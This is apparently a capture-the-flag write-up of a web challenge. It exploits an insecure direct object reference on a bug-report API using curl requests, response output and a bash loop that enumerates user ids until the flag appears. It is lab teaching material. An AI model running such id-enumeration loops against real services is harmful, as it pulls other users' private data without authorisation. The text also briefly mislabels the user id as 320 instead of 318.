# Other bugs
Category: Web

## Description
> Part 4 of Imperva's challenge
> 
> To find web application vulnerabilities, you should understand how the app works!
> 

## Solution

The [previous challenge](JS_and_HTML_are_best_friends.md)'s flag has left us with a hint: `i_can_view_other_bugs`.

Let's understand how the app works by checking the sources. The app's client-side logic resides in an Javascript file called `popup.js`.

It's pretty long, but the relevant parts are:
```javascript

// ...

function loadBugs(id) {
    console.log(id.value);
    fetch('/api/bugs/getBugs.php', {
        method: 'POST',
        body: JSON.stringify({
            "id": id.value
        }),
    }).then(function(response) {
        if (response.ok) {
            return response.json();
        }
        return Promise.reject(response);
    }).then(function(data) {
        populateTable(data["data"]);
        check();
        console.log(data);
    }).catch(function(error) {
        console.warn(error);
    });
}

// ...

var btnList = document.getElementById("btnList");

// ...

btnList.onclick = function() {
    $('#bugsTableData').empty();
    loadBugs(this);
}

```

And in the HTML, we have:

```html
<!-- ... -->
<button type="button" id="btnList" class="btn btn-primary" value="318">Show bugs reports</button>
<!-- ... -->
```

So we can see that when clicking the button, the `loadBugs` function gets called with the user ID from the HTML tag (320) and makes a request to the `/api/bugs/getBugs.php` endpoint with `id=318`.

We can mimic this with Curl:
```console
root@kali:/media/sf_CTFs/technion/Other_bugs# curl 'http://www.vulnet.zone/api/bugs/getBugs.php'   -H 'Connection: keep-alive'   -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'   -H 'Content-Type: text/plain;charset=UTF-8'   -H 'Accept: */*'   -H 'Origin: http://www.vulnet.zone'   -H 'Referer: http://www.vulnet.zone/welcome.php'   -H 'Accept-Language: en-US,en;q=0.9,he;q=0.8'   -H 'Cookie: cookies_here'   --data-binary '{"id":"318"}'   --compressed   --insecure
{"status":"succeeded","data":[{"category":"XSS","company":"Imperva","details":""},{"category":"SSRF","company":"Imperva","details":""}]}
```

But who says we must use our own user ID? Let's try using a different user ID:
```console
root@kali:/media/sf_CTFs/technion/Other_bugs# curl 'http://www.vulnet.zone/api/bugs/getBugs.php'   -H 'Connection: keep-alive'   -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'   -H 'Content-Type: text/plain;charset=UTF-8'   -H 'Accept: */*'   -H 'Origin: http://www.vulnet.zone'   -H 'Referer: http://www.vulnet.zone/welcome.php'   -H 'Accept-Language: en-US,en;q=0.9,he;q=0.8'   -H 'Cookie: cookies_here'   --data-binary '{"id":"1"}'   --compressed   --insecure
{"status":"succeeded","data":[]}
```

It came back empty, but the status is "succeeded". So  we can build a simple bash loop that harvests all the bugs:
```bash
#!/bin/bash

for i in {0..330}
do
   echo $i
   curl 'http://www.vulnet.zone/api/bugs/getBugs.php' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: http://www.vulnet.zone/welcome.php' -H 'Content-Type: text/plain;charset=UTF-8' -H 'Origin: http://www.vulnet.zone' -H 'Connection: keep-alive' -H 'Cookie: cookies_here' --data-raw '{"id":"'$i'"}' && echo
   sleep 1
done
```

Bug #15 returns the flag:
```
{"status":"succeeded","data":[{"category":"IDOR","company":"bugs Inc","details":"cstechnion{aws_likes_ssrf_image}"}]}
```

The flag is a hint for the [next challenge](Bleeding_cloud.md).